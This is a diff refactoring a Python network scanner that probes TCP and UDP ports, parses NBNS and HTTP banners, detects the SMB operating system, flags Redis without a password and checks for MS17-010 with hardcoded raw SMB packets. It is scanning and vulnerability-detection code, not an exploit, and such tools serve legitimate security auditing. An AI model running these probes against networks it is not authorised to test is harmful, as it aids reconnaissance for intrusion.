@@ -46,6 +46,15 @@ GROUP_NAMES = {
 }
 
 
+REQUEST_DATA = {
+    21: b'pwd\r\n',
+    80: b'GET / HTTP/1.0\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n\r\n' % USER_AGENT.encode(),
+    443: b'GET / HTTP/1.0\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n\r\n' % USER_AGENT.encode(),
+    6379: b'INFO\r\n',
+    11211: b'stats items\r\n',
+    # -1: b'unknownport\r\n\r\n',
+}
+
 socket.setdefaulttimeout(DEFAULT_TIMEOUT)
 lock = threading.Lock()  # for print
 
@@ -94,18 +103,8 @@ def set_data(ip, port, flag):
             data = b'ff\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00 CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00!\x00\x01'
 
     elif flag == 'T':
-        if port == 21:
-            data = b'pwd\r\n'
-        elif port == 80:
-            data = b'GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n\r\n' % (ip.encode(), USER_AGENT.encode())
-        elif port == 443:
-            data = b'GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n\r\n' % (ip.encode(), USER_AGENT.encode())
-        elif port == 6379:
-            data = b'INFO\r\n'
-        elif port == 11211:
-            data = b'stats items\r\n'
-        else:
-            data = b'unknownport\r\n\r\n'
+        if port in REQUEST_DATA:
+            data = REQUEST_DATA[port]
     else:
         print('No protocol specifc ...')
         exit()
@@ -113,129 +112,154 @@ def set_data(ip, port, flag):
     return data
 
 
+"""
+functions start with lib_ 
+a function to check rep from a specfic rep (port, respone data)
+so the check_rep function will not be so long 
+"""
+
+def lib_nbns_rep(addr, port, rep):
+    """
+    udp and port==137
+    """
+    try:  # Exception handle here
+        num = ord(rep[56:57].decode())
+    except:
+        return ''
+
+    data = rep[57:]
+    ret, group, unique, other = '', '', '', ''
+            
+    for i in range(num):
+        name = data[18 * i:18 *i + 15].decode()
+        flag_bit = bytes(data[18 * i + 15:18 *i + 16])
+        # print(type(flag_bit))
+        if flag_bit in b'\x00':
+            name_flags = data[18 * i + 16:18 *i + 18]
+            if ord(name_flags[0:1])>=128:
+                group = name.strip()
+            else:
+                unique = name
+    ret = group + '\\' + unique
+    return ret
+
+
+def lib_get_http_info(addr, port, rep):
+    """
+    if rep.startswith('HTTP/1.'):  # Http    
+        lib_get_http_info(xxxxx)
+
+    GET first line HTTP rep and Server and Title
+    """
+    ret = ""
+    reps = rep.split('\\r\\n')  # has been addslashes so double \...
+    ret += reps[0]
+
+    for line in reps:
+        if line.startswith('Server:') or line.startswith('Location:'):
+            # ret += line[line.find(':')+1:]
+            ret += '  ' + line
+            
+    r = re.search('<title>(.*?)</title>', rep)  # get title
+    if r:
+        ret += ' Title: ' + r.group(1)
+    return ret
+
+
+def lib_check_ms_17_010(addr, port):
+    """
+    scan MS17-010 from xunfeng  
+
+    Have bugs in python3
+    """
+    # negotiate_protocol_request = binascii.unhexlify('00000054ff534d42720000000018012800000000000000000000000000002f4b0000c55e003100024c414e4d414e312e3000024c4d312e325830303200024e54204c414e4d414e20312e3000024e54204c4d20302e313200')
+    negotiate_protocol_request = b'\x00\x00\x00T\xffSMBr\x00\x00\x00\x00\x18\x01(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/K\x00\x00\xc5^\x001\x00\x02LANMAN1.0\x00\x02LM1.2X002\x00\x02NT LANMAN 1.0\x00\x02NT LM 0.12\x00'
+    # session_setup_request = binascii.unhexlify('00000063ff534d42730000000018012000000000000000000000000000002f4b0000c55e0dff000000dfff02000100000000000000000000000000400000002600002e0057696e646f7773203230303020323139350057696e646f7773203230303020352e3000')
+    session_setup_request = b'\x00\x00\x00c\xffSMBs\x00\x00\x00\x00\x18\x01 \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/K\x00\x00\xc5^\r\xff\x00\x00\x00\xdf\xff\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00&\x00\x00.\x00Windows 2000 2195\x00Windows 2000 5.0\x00'
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect((addr, port))
+        s.send(negotiate_protocol_request)
+        s.recv(1024)
+        s.send(session_setup_request)
+        data = s.recv(1024)
+        user_id = data[32:34]
+        tree_connect_andx_request = b'\x00\x00\x00' + chr(58 + len(addr)).encode() + b'\xff\x53\x4d\x42\x75\x00\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2f\x4b' + user_id + b'\xc5\x5e\x04\xff\x00\x00\x00\x00\x00\x01\x00\x1a\x00\x00\x5c\x5c' + addr.encode() + b'\x5c\x49\x50\x43\x24\x00\x3f\x3f\x3f\x3f\x3f\x00'
+        s.send(tree_connect_andx_request)
+
+        # tree_connect_andx_request = '000000%xff534d42750000000018012000000000000000000000000000002f4b%sc55e04ff000000000001001a00005c5c%s5c49504324003f3f3f3f3f00' % ((58 + len(addr)), user_id.encode('hex'), addr.encode('hex'))
+        # s.send(binascii.unhexlify(tree_connect_andx_request))
+
+        # print(binascii.unhexlify(tree_connect_andx_request).decode())
+        data = s.recv(1024)
+        allid = data[28:36]
+        # payload = '0000004aff534d422500000000180128000000000000000000000000%s1000000000ffffffff0000000000000000000000004a0000004a0002002300000007005c504950455c00' % allid.encode('hex')
+        # s.send(binascii.unhexlify(payload))
+
+        payload = b'\x00\x00\x00\x4a\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x18\x01\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + allid + b'\x10\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4a\x00\x00\x00\x4a\x00\x02\x00\x23\x00\x00\x00\x07\x00\x5c\x50\x49\x50\x45\x5c\x00'
+        s.send(payload)
+        
+        data = s.recv(1024)
+        s.close()
+        if b'\x05\x02\x00\xc0' in data:
+            return '+Vulnerable+ MS 17-010    '
+        else:
+            return 'MS 17-010 No Vulnerability    '
+    except Exception as e:
+        # print(e, 'MS 17-010')
+        return 'MS 17-010 No Vulnerability    '
+
+
+def lib_check_os_445(addr, port):
+    try:
+        payload1 = b'\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00'
+        payload2 = b'\x00\x00\x01\x0a\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x40\x00\x0c\xff\x00\x0a\x01\x04\x41\x32\x00\x00\x00\x00\x00\x00\x00\x4a\x00\x00\x00\x00\x00\xd4\x00\x00\xa0\xcf\x00\x60\x48\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x3e\x30\x3c\xa0\x0e\x30\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a\xa2\x2a\x04\x28\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x07\x82\x08\xa2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x02\xce\x0e\x00\x00\x00\x0f\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x65\x00\x72\x00\x20\x00\x32\x00\x30\x00\x30\x00\x33\x00\x20\x00\x33\x00\x37\x00\x39\x00\x30\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x69\x00\x63\x00\x65\x00\x20\x00\x50\x00\x61\x00\x63\x00\x6b\x00\x20\x00\x32\x00\x00\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x65\x00\x72\x00\x20\x00\x32\x00\x30\x00\x30\x00\x33\x00\x20\x00\x35\x00\x2e\x00\x32\x00\x00\x00\x00\x00'
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(10)
+        s.connect((addr, port))
+        s.send(payload1)
+        s.recv(1024)
+        # print(s.recv(1024).replace(b'\x00', b'').decode(errors='ignore'))
+        s.send(payload2)
+        data = s.recv(1024)
+        length = ord(data[43:44]) + ord(data[44:45]) * 256
+        # print(length)
+        data = data[47 + length:]
+        # print(data.decode('UTF-16LE', errors='ignore').replace('\x00', '|'))
+        
+        if isinstance(data, str):
+            return data.replace('\x00\x00', '|').replace('\x00', '')
+            
+        else:
+            data = data.replace(b'\x00\x00', b'|').replace(b'\x00', b'')
+            return data.decode('utf-8', errors='ignore')
+           
+    except Exception as e:
+        print(e, 'smbos')
+        print(addr, port)
+        return 'Fail to detect OS ...'
+        
+
 def check_rep(addr, port, rep, flag):
     # print((addr, port, rep, flag))
     if flag == 'U':
         if port == 137:  # parse NBNS may have problem
-            try:  # Exception handle here
-                num = ord(rep[56:57].decode())
-            except:
-                return ''
-            # print(num)
-            data = rep[57:]
-            ret = ''
-            group = ''
-            unique = ''
-            other = ''
-            
-            for i in range(num):
-                name = data[18 * i:18 *i + 15].decode()
-                flag_bit = bytes(data[18 * i + 15:18 *i + 16])
-                # print(type(flag_bit))
-                if flag_bit in b'\x00':
-                    name_flags = data[18 * i + 16:18 *i + 18]
-                    if ord(name_flags[0:1])>=128:
-                        group = name.strip()
-
-                    else:
-                        unique = name
-            ret = group + '\\' + unique
-            return ret 
+            return lib_nbns_rep(addr, port, rep)
         else:
             return rep
-    elif flag == 'T':
-        ret = ''
-        if rep.startswith('HTTP/1.'):  # Http
-            reps = rep.split('\\r\\n')  # has been addslashes so double \...
-            ret += reps[0]
 
-            for line in reps:
-                if line.startswith('Server:') or line.startswith('Location:'):
-                    # ret += line[line.find(':')+1:]
-                    ret += '  ' + line
-            
-            r = re.search('<title>(.*?)</title>', rep)  # get title
-            if r:
-                ret += ' Title: ' + r.group(1)
-            return ret
+    elif flag == 'T':
+        if rep.startswith('HTTP/1.'):  # Http
+            return lib_get_http_info(addr, port, rep)
 
         elif port == 445: 
-            """
-            scan MS17-010 from xunfeng  
-
-            Have bugs in python3
-            """
-            # negotiate_protocol_request = binascii.unhexlify('00000054ff534d42720000000018012800000000000000000000000000002f4b0000c55e003100024c414e4d414e312e3000024c4d312e325830303200024e54204c414e4d414e20312e3000024e54204c4d20302e313200')
-            negotiate_protocol_request = b'\x00\x00\x00T\xffSMBr\x00\x00\x00\x00\x18\x01(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/K\x00\x00\xc5^\x001\x00\x02LANMAN1.0\x00\x02LM1.2X002\x00\x02NT LANMAN 1.0\x00\x02NT LM 0.12\x00'
-            # session_setup_request = binascii.unhexlify('00000063ff534d42730000000018012000000000000000000000000000002f4b0000c55e0dff000000dfff02000100000000000000000000000000400000002600002e0057696e646f7773203230303020323139350057696e646f7773203230303020352e3000')
-            session_setup_request = b'\x00\x00\x00c\xffSMBs\x00\x00\x00\x00\x18\x01 \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/K\x00\x00\xc5^\r\xff\x00\x00\x00\xdf\xff\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00&\x00\x00.\x00Windows 2000 2195\x00Windows 2000 5.0\x00'
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(5)
-                s.connect((addr, port))
-                s.send(negotiate_protocol_request)
-                s.recv(1024)
-                s.send(session_setup_request)
-                data = s.recv(1024)
-                user_id = data[32:34]
-                tree_connect_andx_request = b'\x00\x00\x00' + chr(58 + len(addr)).encode() + b'\xff\x53\x4d\x42\x75\x00\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2f\x4b' + user_id + b'\xc5\x5e\x04\xff\x00\x00\x00\x00\x00\x01\x00\x1a\x00\x00\x5c\x5c' + addr.encode() + b'\x5c\x49\x50\x43\x24\x00\x3f\x3f\x3f\x3f\x3f\x00'
-                s.send(tree_connect_andx_request)
-
-                # tree_connect_andx_request = '000000%xff534d42750000000018012000000000000000000000000000002f4b%sc55e04ff000000000001001a00005c5c%s5c49504324003f3f3f3f3f00' % ((58 + len(addr)), user_id.encode('hex'), addr.encode('hex'))
-                # s.send(binascii.unhexlify(tree_connect_andx_request))
-
-                # print(binascii.unhexlify(tree_connect_andx_request).decode())
-                data = s.recv(1024)
-                allid = data[28:36]
-                # payload = '0000004aff534d422500000000180128000000000000000000000000%s1000000000ffffffff0000000000000000000000004a0000004a0002002300000007005c504950455c00' % allid.encode('hex')
-                # s.send(binascii.unhexlify(payload))
-
-                payload = b'\x00\x00\x00\x4a\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x18\x01\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + allid + b'\x10\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4a\x00\x00\x00\x4a\x00\x02\x00\x23\x00\x00\x00\x07\x00\x5c\x50\x49\x50\x45\x5c\x00'
-                s.send(payload)
-                
-                data = s.recv(1024)
-                s.close()
-                if b'\x05\x02\x00\xc0' in data:
-                    ret += '+Vulnerable+ MS 17-010    '
-                else:
-                    ret += 'MS 17-010 No Vulnerability    '
-                s.close()
-            except Exception as e:
-                # print(e, 'MS 17-010')
-                ret += 'MS 17-010 No Vulnerability    '
-            try:
-                payload1 = b'\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00'
-                payload2 = b'\x00\x00\x01\x0a\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x40\x00\x0c\xff\x00\x0a\x01\x04\x41\x32\x00\x00\x00\x00\x00\x00\x00\x4a\x00\x00\x00\x00\x00\xd4\x00\x00\xa0\xcf\x00\x60\x48\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x3e\x30\x3c\xa0\x0e\x30\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a\xa2\x2a\x04\x28\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x07\x82\x08\xa2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x02\xce\x0e\x00\x00\x00\x0f\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x65\x00\x72\x00\x20\x00\x32\x00\x30\x00\x30\x00\x33\x00\x20\x00\x33\x00\x37\x00\x39\x00\x30\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x69\x00\x63\x00\x65\x00\x20\x00\x50\x00\x61\x00\x63\x00\x6b\x00\x20\x00\x32\x00\x00\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x65\x00\x72\x00\x20\x00\x32\x00\x30\x00\x30\x00\x33\x00\x20\x00\x35\x00\x2e\x00\x32\x00\x00\x00\x00\x00'
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(10)
-                s.connect((addr, port))
-                s.send(payload1)
-                s.recv(1024)
-                # print(s.recv(1024).replace(b'\x00', b'').decode(errors='ignore'))
-                s.send(payload2)
-                data = s.recv(1024)
-                length = ord(data[43:44]) + ord(data[44:45]) * 256
-                # print(length)
-                data = data[47 + length:]
-                # print(data.decode('UTF-16LE', errors='ignore').replace('\x00', '|'))
-                
-                if isinstance(data, str):
-                    data =  data.replace('\x00\x00', '|').replace('\x00', '')
-                    ret += data
-                else:
-                    data = data.replace(b'\x00\x00', b'|').replace(b'\x00', b'')
-                    ret += data.decode('utf-8', errors='ignore')
-                   
-            except Exception as e:
-                ret += 'Fail to detect OS ...'
-                print(e, 'smbos')
-                print(addr, port)
-    
+            ret = lib_check_ms_17_010(addr, port) + ' '
+            ret += lib_check_os_445(addr, port)
             return ret
 
         elif port == 6379 and not 'Authentication required' in rep:
             return '+Vulnerable+ Redis without password'
-
         else:
             return rep
     else:
@@ -269,7 +293,7 @@ def thread(ports, udp_ports):
                 pass
 
         for port in ports:
-            if stop == True:
+            if stop:
                 return False
 
             rep = ''
@@ -291,19 +315,18 @@ def thread(ports, udp_ports):
                 # print(e)
                 pass
 
-            try:    
 
-                if isinstance(rep, str):
-                    tmp_rep = rep.replace('\n', '\\n').replace('\r', '\\r')
-                else:
-                    tmp_rep = rep.decode('utf-8', errors='ignore').replace('\n', '\\n').replace('\r', '\\r')
-
-                tmp_rep = check_rep(addr, port, tmp_rep, 'T')  # Exception in function ??
-                msg += tmp_rep
-            except Exception as e:
-                print('Check rep error ??? ', e)
-                print(addr, port)
-                print(rep)
+            if isinstance(rep, str):
+                tmp_rep = rep.replace('\n', '\\n').replace('\r', '\\r') # .encode('utf-8', errors='ignore')
+            else:
+                tmp_rep = rep.decode('utf-8', errors='ignore').replace('\n', '\\n').replace('\r', '\\r')
+                # print('success')
+            tmp_rep = check_rep(addr, port, tmp_rep, 'T')  # Exception in function ??
+            msg += tmp_rep
+            #except Exception as e:
+            #    print('-----  Error check rep error ', e)
+            #    print(addr, port)
+            #    print(rep)
 
         if msg:
             lock.acquire()
